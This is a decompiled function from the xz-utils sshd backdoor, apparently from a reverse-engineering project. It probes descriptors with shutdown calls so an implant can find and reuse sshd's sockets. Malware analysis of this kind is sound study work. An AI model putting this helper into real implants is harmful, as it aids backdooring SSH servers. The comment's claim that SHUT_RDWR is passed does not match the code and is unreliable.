// /home/kali/xzre-ghidra/xzregh/107BC0_sshd_get_usable_socket.c
// Function: sshd_get_usable_socket @ 0x107BC0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_usable_socket(int * pSock, int socket_index, libc_imports_t * imports)


/*
 * AutoDoc: Runs a brute-force probe across file descriptors 0–63, calling `shutdown(fd, SHUT_RDWR)` on each one and treating
 * `EINVAL`/`ENOTCONN` (or a non-zero return) as evidence that the descriptor is open but idle. Every candidate bumps a
 * counter, and when the counter reaches the requested `socket_index` the fd is returned to the caller so implants can
 * recycle sshd's sockets even when the monitor struct is missing.
 */

#include "xzre_types.h"

BOOL sshd_get_usable_socket(int *pSock,int socket_index,libc_imports_t *imports)

{
  int shutdown_result;
  int *errno_ptr;
  int candidate_fd;
  int usable_index;
  int sockfd;
  
  if (pSock == (int *)0x0) {
    return FALSE;
  }
  if (imports != (libc_imports_t *)0x0) {
    usable_index = -1;
    candidate_fd = 0;
    do {
      sockfd = 0;
      if ((imports->shutdown != (pfn_shutdown_t)0x0) &&
         (imports->__errno_location != (pfn___errno_location_t)0x0)) {
        shutdown_result = (*imports->shutdown)(candidate_fd,0x7fffffff);
        if (shutdown_result < 0) {
          errno_ptr = (*imports->__errno_location)();
LAB_00107c21:
          if ((*errno_ptr != 0x16) && (*errno_ptr != 0x6b)) goto LAB_00107c40;
        }
        else {
          errno_ptr = &sockfd;
          if (shutdown_result != 0) goto LAB_00107c21;
        }
        usable_index = usable_index + 1;
        if (usable_index == socket_index) {
          *pSock = candidate_fd;
          return TRUE;
        }
      }
LAB_00107c40:
      candidate_fd = candidate_fd + 1;
    } while (candidate_fd != 0x40);
  }
  return FALSE;
}

